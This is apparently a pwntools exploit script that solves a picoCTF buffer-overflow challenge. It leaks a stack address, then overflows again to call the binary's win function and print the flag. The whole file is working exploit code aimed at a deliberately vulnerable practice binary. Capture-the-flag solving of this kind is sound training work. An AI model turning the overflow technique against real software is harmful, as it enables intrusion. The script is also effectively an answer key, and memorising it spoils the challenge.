#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("saturn.picoctf.net", 59568)

    return r


def main():
    r = conn()

    payload = flat(
        b"A" * 10,
        exe.bss(),
        exe.sym.UnderConstruction,
        exe.sym.vuln
    )

    r.sendlineafter(b"the flag", payload)
    r.recvuntil(b"Age of user: ")

    stack = int(r.recvline().strip(), 16)
    flag_addr = stack - 0x34

    log.info(f"stack @ 0x{stack:x}")
    log.info(f"flag  @ 0x{flag_addr:x}")

    payload = flat(
        b"A" * 14,
        exe.sym.win,

        # We have to add few ret to creating spacing between where
        # the flag is located. The function `__x86.get_pc_thunk.di`
        # somehow overwrites the flag string but spacing solve this
        # small issue. We can add a bunch of ret to solve this
        p32(exe.sym.vuln+56) * 10,
        exe.sym.vuln + 34
    )

    r.sendlineafter(b"the flag", payload)
    flag = r.recvlines(3)[-1].decode()
    log.success(f"Flag: {flag}")


if __name__ == "__main__":
    main()
